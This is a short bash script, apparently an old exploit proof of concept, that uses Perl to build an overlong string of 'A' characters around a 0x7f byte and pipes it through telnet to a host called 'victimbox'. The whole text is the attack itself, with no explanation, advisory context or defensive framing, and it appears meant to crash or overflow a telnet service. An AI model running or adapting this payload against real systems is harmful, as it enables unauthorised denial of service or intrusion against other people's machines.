#!/bin/bash
  ( sleep 1
    perl -e '{printf "%s\x7f%s","A"x4500,"A"x100}'
    sleep 3
  ) | telnet victimbox
  - eof -
